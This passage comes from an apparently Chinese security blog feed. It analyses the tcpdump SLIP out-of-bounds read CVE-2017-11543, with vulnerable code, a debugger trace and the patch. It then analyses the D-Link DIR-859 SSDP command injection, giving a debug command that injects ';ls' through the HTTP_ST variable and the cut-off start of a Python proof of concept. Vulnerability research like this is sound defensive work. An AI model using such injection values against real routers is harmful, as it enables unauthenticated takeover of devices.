字节，实际上并未使用，因此被设置为 0</span>        bpf_u_int32 sigfigs<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 精确时间戳：4 字节，实际上并未使用，因此被设置为 0</span>        bpf_u_int32 snaplen<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 数据包最大长度：4 字节，该值设置所抓获的数据包的最大长度</span>        bpf_u_int32 linktype<span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">// 链路层类型：4 字节，数据包的链路层包头决定了链路层的类型</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以下是数据值与链路层类型的对应表<br>0            BSD       loopback devices, except for later OpenBSD<br>1            Ethernet, and Linux loopback devices   以太网类型，大多数的数据包为这种类型。<br>6            802.5 Token Ring<br>7            ARCnet<br>8            SLIP<br>9            PPP<br>10          FDDI<br>100        LLC/SNAP-encapsulated ATM<br>101        raw IP, with no link<br>102        BSD/OS SLIP<br>103        BSD/OS PPP<br>104        Cisco HDLC<br>105        802.11<br>108        later OpenBSD loopback devices (with the AF_value in network byte order)<br>113        special Linux cooked capture<br>114        LocalTalk</p><p>接下来是数据包头</p><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">struct</span> pcap_pkthdr<span class="token punctuation">{</span>    <span class="token keyword">struct</span> tim  ts<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 时间戳，包括：秒计时：32位，一个UNIX格式的精确到秒时间值，用来记录数据包抓获的时间，记录方式是记录从格林尼治时间的1970年1月1日 00:00:00 到抓包时经过的秒数；</span>    DWORD       caplen<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 32位 ，标识所抓获的数据包保存在pcap文件中的实际长度，以字节为单位。</span>    DWORD       len<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 所抓获的数据包的真实长度，如果文件中保存不是完整的数据包，那么这个值可能要比前面的数据包长度的值大。</span><span class="token punctuation">}</span><span class="token keyword">struct</span> tim<span class="token punctuation">{</span>    DWORD GMTtime<span class="token punctuation">;</span>    DWORD microTime<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用二进制编辑器查看数据包：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/04/03/cve-2017-11543-tcpdump-yue-jie-fang-wen-lou-dong/2.png"></div>我们看到linktype的值是8，所以链路层类型是SLIP，SLIP包结构如下：```+-------------------------+|        Direction                 ||        (1 Octet)                 |+-------------------------+|       Packet type              ||        (1 Octet)                  |+-------------------------+| Compression information ||       (14 Octets)                   |+-------------------------+|         Payload                    |.                                          ..                                          ..                                          .```Direction字段指示发送或接收。0本机接收，1本机发送。<p>在这里 direction 是 0xe7，并且由于 packet type 被设置了，所以 payload 是一个压缩的 TCP/IP 包，它的 packet type 和 compression information 共同构成了压缩的 TCP/IP 数据报，其结构如下：</p><pre><code>+-------------------------------+ Byte|   | C | I | P | S | A | W | U | 0+-------------------------------+|       connection number       | 1+-------------------------------+|         TCP checksum              | 2-3+-------------------------------+|             data                          | 3-16.                                                 ..                                                 ..                                                 .</code></pre><p><strong>漏洞代码</strong>：</p><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span><span class="token function">sliplink_print</span><span class="token punctuation">(</span>netdissect_options <span class="token operator">*</span>ndo<span class="token punctuation">,</span>               <span class="token keyword">register</span> <span class="token keyword">const</span> u_char <span class="token operator">*</span>p<span class="token punctuation">,</span> <span class="token keyword">register</span> <span class="token keyword">const</span> <span class="token keyword">struct</span> ip <span class="token operator">*</span>ip<span class="token punctuation">,</span>               <span class="token keyword">register</span> u_int length<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> dir<span class="token punctuation">;</span>    u_int hlen<span class="token punctuation">;</span>    dir <span class="token operator">=</span> p<span class="token punctuation">[</span>SLX_DIR<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">ND_PRINT</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ndo<span class="token punctuation">,</span> dir <span class="token operator">==</span> SLIPDIR_IN <span class="token operator">?</span> <span class="token string">"I "</span> <span class="token punctuation">:</span> <span class="token string">"O "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>ndo<span class="token operator">-></span>ndo_nflag<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">/* XXX just dump the header */</span>        <span class="token keyword">register</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> SLX_CHDR<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> SLX_CHDR <span class="token operator">+</span> CHDR_LEN <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>            <span class="token function">ND_PRINT</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ndo<span class="token punctuation">,</span> <span class="token string">"%02x."</span><span class="token punctuation">,</span> p<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">ND_PRINT</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ndo<span class="token punctuation">,</span> <span class="token string">"%02x: "</span><span class="token punctuation">,</span> p<span class="token punctuation">[</span>SLX_CHDR <span class="token operator">+</span> CHDR_LEN <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span>p<span class="token punctuation">[</span>SLX_CHDR<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xf0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">case</span> TYPE_IP<span class="token punctuation">:</span>        <span class="token function">ND_PRINT</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ndo<span class="token punctuation">,</span> <span class="token string">"ip %d: "</span><span class="token punctuation">,</span> length <span class="token operator">+</span> SLIP_HDRLEN<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> TYPE_UNCOMPRESSED_TCP<span class="token punctuation">:</span>        <span class="token comment" spellcheck="true">/*         * The connection id is stored in the IP protocol field.         * Get it from the link layer since sl_uncompress_tcp()         * has restored the IP header copy to IPPROTO_TCP.         */</span>        lastconn <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">struct</span> ip <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>p<span class="token punctuation">[</span>SLX_CHDR<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-></span>ip_p<span class="token punctuation">;</span>        hlen <span class="token operator">=</span> <span class="token function">IP_HL</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">;</span>        hlen <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">TH_OFF</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">struct</span> tcphdr <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span>ip<span class="token punctuation">)</span><span class="token punctuation">[</span>hlen<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        lastlen<span class="token punctuation">[</span>dir<span class="token punctuation">]</span><span class="token punctuation">[</span>lastconn<span class="token punctuation">]</span> <span class="token operator">=</span> length <span class="token operator">-</span> <span class="token punctuation">(</span>hlen <span class="token operator">&lt;&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">ND_PRINT</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ndo<span class="token punctuation">,</span> <span class="token string">"utcp %d: "</span><span class="token punctuation">,</span> lastconn<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">default</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>p<span class="token punctuation">[</span>SLX_CHDR<span class="token punctuation">]</span> <span class="token operator">&amp;</span> TYPE_COMPRESSED_TCP<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">compressed_sl_print</span><span class="token punctuation">(</span>ndo<span class="token punctuation">,</span> <span class="token operator">&amp;</span>p<span class="token punctuation">[</span>SLX_CHDR<span class="token punctuation">]</span><span class="token punctuation">,</span> ip<span class="token punctuation">,</span>                length<span class="token punctuation">,</span> dir<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">ND_PRINT</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ndo<span class="token punctuation">,</span> <span class="token string">": "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span>            <span class="token function">ND_PRINT</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ndo<span class="token punctuation">,</span> <span class="token string">"slip-%d!: "</span><span class="token punctuation">,</span> p<span class="token punctuation">[</span>SLX_CHDR<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">static</span> <span class="token keyword">void</span><span class="token function">compressed_sl_print</span><span class="token punctuation">(</span>netdissect_options <span class="token operator">*</span>ndo<span class="token punctuation">,</span>                    <span class="token keyword">const</span> u_char <span class="token operator">*</span>chdr<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">struct</span> ip <span class="token operator">*</span>ip<span class="token punctuation">,</span>                    u_int length<span class="token punctuation">,</span> <span class="token keyword">int</span> dir<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">register</span> <span class="token keyword">const</span> u_char <span class="token operator">*</span>cp <span class="token operator">=</span> chdr<span class="token punctuation">;</span>    <span class="token keyword">register</span> u_int flags<span class="token punctuation">,</span> hlen<span class="token punctuation">;</span>    flags <span class="token operator">=</span> <span class="token operator">*</span>cp<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>flags <span class="token operator">&amp;</span> NEW_C<span class="token punctuation">)</span> <span class="token punctuation">{</span>        lastconn <span class="token operator">=</span> <span class="token operator">*</span>cp<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token function">ND_PRINT</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ndo<span class="token punctuation">,</span> <span class="token string">"ctcp %d"</span><span class="token punctuation">,</span> lastconn<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span>        <span class="token function">ND_PRINT</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ndo<span class="token punctuation">,</span> <span class="token string">"ctcp *"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* skip tcp checksum */</span>    cp <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span>flags <span class="token operator">&amp;</span> SPECIALS_MASK<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">case</span> SPECIAL_I<span class="token punctuation">:</span>        <span class="token function">ND_PRINT</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ndo<span class="token punctuation">,</span> <span class="token string">" *SA+%d"</span><span class="token punctuation">,</span> lastlen<span class="token punctuation">[</span>dir<span class="token punctuation">]</span><span class="token punctuation">[</span>lastconn<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> SPECIAL_D<span class="token punctuation">:</span>        <span class="token function">ND_PRINT</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ndo<span class="token punctuation">,</span> <span class="token string">" *S+%d"</span><span class="token punctuation">,</span> lastlen<span class="token punctuation">[</span>dir<span class="token punctuation">]</span><span class="token punctuation">[</span>lastconn<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">default</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>flags <span class="token operator">&amp;</span> NEW_U<span class="token punctuation">)</span>            cp <span class="token operator">=</span> <span class="token function">print_sl_change</span><span class="token punctuation">(</span>ndo<span class="token punctuation">,</span> <span class="token string">"U="</span><span class="token punctuation">,</span> cp<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>flags <span class="token operator">&amp;</span> NEW_W<span class="token punctuation">)</span>            cp <span class="token operator">=</span> <span class="token function">print_sl_winchange</span><span class="token punctuation">(</span>ndo<span class="token punctuation">,</span> cp<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>flags <span class="token operator">&amp;</span> NEW_A<span class="token punctuation">)</span>            cp <span class="token operator">=</span> <span class="token function">print_sl_change</span><span class="token punctuation">(</span>ndo<span class="token punctuation">,</span> <span class="token string">"A+"</span><span class="token punctuation">,</span> cp<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>flags <span class="token operator">&amp;</span> NEW_S<span class="token punctuation">)</span>            cp <span class="token operator">=</span> <span class="token function">print_sl_change</span><span class="token punctuation">(</span>ndo<span class="token punctuation">,</span> <span class="token string">"S+"</span><span class="token punctuation">,</span> cp<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>flags <span class="token operator">&amp;</span> NEW_I<span class="token punctuation">)</span>        cp <span class="token operator">=</span> <span class="token function">print_sl_change</span><span class="token punctuation">(</span>ndo<span class="token punctuation">,</span> <span class="token string">"I+"</span><span class="token punctuation">,</span> cp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/*     * 'hlen' is the length of the uncompressed TCP/IP header (in words).     * 'cp - chdr' is the length of the compressed header.     * 'length - hlen' is the amount of data in the packet.     */</span>    hlen <span class="token operator">=</span> <span class="token function">IP_HL</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">;</span>    hlen <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">TH_OFF</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">struct</span> tcphdr <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> int32_t <span class="token operator">*</span><span class="token punctuation">)</span>ip<span class="token punctuation">)</span><span class="token punctuation">[</span>hlen<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    lastlen<span class="token punctuation">[</span>dir<span class="token punctuation">]</span><span class="token punctuation">[</span>lastconn<span class="token punctuation">]</span> <span class="token operator">=</span> length <span class="token operator">-</span> <span class="token punctuation">(</span>hlen <span class="token operator">&lt;&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">ND_PRINT</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ndo<span class="token punctuation">,</span> <span class="token string">" %d (%ld)"</span><span class="token punctuation">,</span> lastlen<span class="token punctuation">[</span>dir<span class="token punctuation">]</span><span class="token punctuation">[</span>lastconn<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span>cp <span class="token operator">-</span> chdr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>问题发生的原因是 sliplink_print 函数的 ND_PRINT((ndo, dir == SLIPDIR_IN ? “I “ : “O “)); 没有考虑到 dir 既不是 0 也不是 1 的情况，错误地把它当做一个发送的数据包处理，然后调用了 compressed_sl_print 函数:</p><pre class="line-numbers language-c"><code class="language-c">lastlen<span class="token punctuation">[</span>dir<span class="token punctuation">]</span><span class="token punctuation">[</span>lastconn<span class="token punctuation">]</span> <span class="token operator">=</span> length <span class="token operator">-</span> <span class="token punctuation">(</span>hlen <span class="token operator">&lt;&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>lastlen[dir][lastconn] 导致非法内存地址访问。</p><h1 id="0x04-调试"><a href="#0x04-调试" class="headerlink" title="0x04 调试"></a>0x04 调试</h1><p>通过”gdb tcpdump -q”定位到 crash 的源代码</p><div style="width:70%;margin:auto">{% asset_img 3.png %}</div><pre><code>pwndbg&gt; bt#0  0x00000000005025a7 in compressed_sl_print (dir=&lt;optimized out&gt;, length=3890734886, ip=0x7ffff7f3b810, chdr=0x7ffff7f3b801 '\347' &lt;repeats 21 times&gt;, &lt;incomplete sequence \312&gt;, ndo=0x7fffffffca10) at ./print-sl.c:253#1  sliplink_print (length=3890734886, ip=0x7ffff7f3b810, p=0x7ffff7f3b800 '\347' &lt;repeats 22 times&gt;, &lt;incomplete sequence \312&gt;, ndo=0x7fffffffca10) at ./print-sl.c:166#2  sl_if_print (ndo=0x7fffffffca10, h=&lt;optimized out&gt;, p=0x7ffff7f3b800 '\347' &lt;repeats 22 times&gt;, &lt;incomplete sequence \312&gt;) at ./print-sl.c:77#3  0x00000000004183c0 in pretty_print_packet (ndo=0x7fffffffca10, h=0x7fffffffc6f0, sp=0x7ffff7f3b800 '\347' &lt;repeats 22 times&gt;, &lt;incomplete sequence \312&gt;, packets_captured=&lt;optimized out&gt;) at ./print.c:339#4  0x000000000040d58f in print_packet (user=&lt;optimized out&gt;, h=&lt;optimized out&gt;, sp=&lt;optimized out&gt;) at ./tcpdump.c:2501#5  0x00007ffff6802a94 in ?? () from /usr/lib/x86_64-linux-gnu/libpcap.so.0.8#6  0x00007ffff67f31cf in pcap_loop () from /usr/lib/x86_64-linux-gnu/libpcap.so.0.8#7  0x0000000000409a35 in main (argc=argc@entry=4, argv=argv@entry=0x7fffffffdf48) at ./tcpdump.c:2004#8  0x00007ffff643a830 in __libc_start_main (main=0x408580 &lt;main&gt;, argc=4, argv=0x7fffffffdf48, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=0x7fffffffdf38) at ../csu/libc-start.c:291#9  0x000000000040c619 in _start ()</code></pre><p>sliplink_print() 中调用了 compressed_sl_print() 函数,<br>dir 是 compressed_sl_print() 的参数，而根据调试时的 backtrace，compressed_sl_print() 调用时传递的 dir 即为 0xe7(231)。</p><p>compressed_sl_print 的参数：</p><p>dir=0xe7 是 direction<br>length=0xe7e7e736 是长度，由包头的 len 计算得到ip=0x7ffff7fd8780 指向 datachdr=0xb65ba801 指向压缩的 TCP/IP 头<br>ndo=0x7fffffffca20 是其他一些选项</p><p>在 lastlen[dir][lastconn] = length - (hlen &lt;&lt; 2); 语句中：</p><p>lastlen定义：static u_int lastlen[2][256];</p><p>dir = 0xe7那么肯定就越界了。</p><h1 id="0x05-修复"><a href="#0x05-修复" class="headerlink" title="0x05 修复"></a>0x05 修复</h1><pre class="line-numbers language-c"><code class="language-c"><span class="token operator">-</span>       <span class="token function">ND_PRINT</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ndo<span class="token punctuation">,</span> dir <span class="token operator">==</span> SLIPDIR_IN <span class="token operator">?</span> <span class="token string">"I "</span> <span class="token punctuation">:</span> <span class="token string">"O "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">+</span>       <span class="token keyword">switch</span> <span class="token punctuation">(</span>dir<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token operator">+</span>       <span class="token keyword">case</span> SLIPDIR_IN<span class="token punctuation">:</span><span class="token operator">+</span>               <span class="token function">ND_PRINT</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ndo<span class="token punctuation">,</span> <span class="token string">"I "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">+</span>               <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token operator">+</span><span class="token operator">+</span>       <span class="token keyword">case</span> SLIPDIR_OUT<span class="token punctuation">:</span><span class="token operator">+</span>               <span class="token function">ND_PRINT</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ndo<span class="token punctuation">,</span> <span class="token string">"O "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">+</span>               <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token operator">+</span><span class="token operator">+</span>       <span class="token keyword">default</span><span class="token punctuation">:</span><span class="token operator">+</span>               <span class="token function">ND_PRINT</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ndo<span class="token punctuation">,</span> <span class="token string">"Invalid direction %d "</span><span class="token punctuation">,</span> dir<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">+</span>               dir <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token operator">+</span>               <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token operator">+</span>       <span class="token punctuation">}</span><span class="token operator">+</span>               <span class="token function">ND_PRINT</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ndo<span class="token punctuation">,</span> <span class="token string">"utcp %d: "</span><span class="token punctuation">,</span> lastconn<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">+</span>               <span class="token keyword">if</span> <span class="token punctuation">(</span>dir <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 在存取操作前检查 dir 的值</span><span class="token operator">+</span>                       <span class="token comment" spellcheck="true">/* Direction is bogus, don't use it */</span><span class="token operator">+</span>                       <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token operator">+</span>               <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看出增加了一个 switch 判断，不合法的全都把 dir 设置为了 -1。存取操作前检查 dir 的值，-1退出。</p><h1 id="0x06-pwn掉？"><a href="#0x06-pwn掉？" class="headerlink" title="0x06 pwn掉？"></a>0x06 pwn掉？</h1><p>调这个漏洞是看到rce的原因，但实在没想到如何rce</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> linux漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 越界访问 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>D-Link DIR-859 CVE-201917621-未授权命令执行漏洞分析</title>
      <link href="/2021/04/01/d-link-dir-859-cve-201917621-wei-shou-quan-ming-ling-zhi-xing-lou-dong-fen-xi/"/>
      <url>/2021/04/01/d-link-dir-859-cve-201917621-wei-shou-quan-ming-ling-zhi-xing-lou-dong-fen-xi/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-漏洞简介"><a href="#0x01-漏洞简介" class="headerlink" title="0x01 漏洞简介"></a>0x01 漏洞简介</h1><p>D-Link DIR-859设备LAN层中出现未经身份验证的命令执行漏洞,<br>主要是在ssdpcgi函数中发现了该漏洞，且因为SSDP协议缘故，该漏洞利用无须通过认证 漏洞起因主要是因为环境变量没有进行字符过滤，即使这个函数之前已经打过补丁,但是而由于环境变量未正确过滤而造成远程命令执行.</p><p>路由器型号：DIR-859<br>固件版本：1.06b01 Beta01，1.05<br>架构：MIPS 32位</p><p>受影响的D-Link版本</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/04/01/d-link-dir-859-cve-201917621-wei-shou-quan-ming-ling-zhi-xing-lou-dong-fen-xi/0.png"></div><h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><p>分析ssdpcgi_main函数：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/04/01/d-link-dir-859-cve-201917621-wei-shou-quan-ming-ling-zhi-xing-lou-dong-fen-xi/1.png"></div><p>首先通过getenv()获取环境变量HTTP_ST，经过判断拼接成新的字符串,最后将新生成的字符串作为lxmldbc_system()的变量进行传递。</p><p>要触发漏洞需要满足几个条件：<br>1.环境变量有“urn:”四个字符<br>2.将要执行的命令通过strstr()拼接到device或者service上，以满足命令执行条件<br>3.将拼接的字符串传递给lxmldbc_system()函数</p><p>该函数：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/04/01/d-link-dir-859-cve-201917621-wei-shou-quan-ming-ling-zhi-xing-lou-dong-fen-xi/2.png"></div><p>格式化字符串后直接执行</p><h1 id="0x03-动态调试"><a href="#0x03-动态调试" class="headerlink" title="0x03 动态调试"></a>0x03 动态调试</h1><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">chroot</span> <span class="token keyword">.</span> ./qemu-mips-static -0 <span class="token string">"ssdpcgi"</span> -E REMOTE_ADDR<span class="token operator">=</span>127.0.0.1 -E SERVER_ID<span class="token operator">=</span>1 -E REMOTE_PORT<span class="token operator">=</span>13 -E HTTP_ST<span class="token operator">=</span><span class="token string">"urn:device:1;ls"</span> -E REQUEST_URL<span class="token operator">=</span>/ -E REQUEST_METHOD<span class="token operator">=</span>M-SEARCH -g 10000 ./htdocs/cgibin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>注意在这里需要改一下寄存器强制跳转,bne a,b,function意思是a!=b跳转function</strong></p><div style="width:70%;margin:auto">{% asset_img 3.png %}</div><p>成功的获取环境变量“HTTP_ST”</p><div style="width:70%;margin:auto">{% asset_img 4.png %}</div><p>开始比较字符串：</p><div style="width:70%;margin:auto">{% asset_img 5.png %}</div><p>通过比较”urn:”字符串：</p><div style="width:70%;margin:auto">{% asset_img 6.png %}</div><p>执行strstr(HTTP_ST,”:device:”)</p><div style="width:70%;margin:auto">{% asset_img 7.png %}</div><p>看起来是通过判断并返回起始字符串，地址好像有区别，可能是gdb的原因，比较的第一个参数起始地址是0x7ffff7c9，返回却是0x7ffff7c8</p><div style="width:70%;margin:auto">{% asset_img 8.png %}</div><p>进入lxmldbc_system，执行vsnprintf函数</p><div style="width:70%;margin:auto">{% asset_img 9.png %}</div><p>成功RCE：</p><div style="width:70%;margin:auto">{% asset_img 10.png %}</div><h1 id="0x04-poc"><a href="#0x04-poc" class="headerlink" title="0x04 poc"></a>0x04 poc</h1><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">import</span> socket<span class="token keyword">from</span> time <span class="token keyword">import</span> sleep<span class="token comment" spellcheck="true"># Exploit By Miguel Mendez - @s1kr10s</span><span class="token keyword">def</span> <span class="token function">config_payload</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">:</span>    header <span class="token 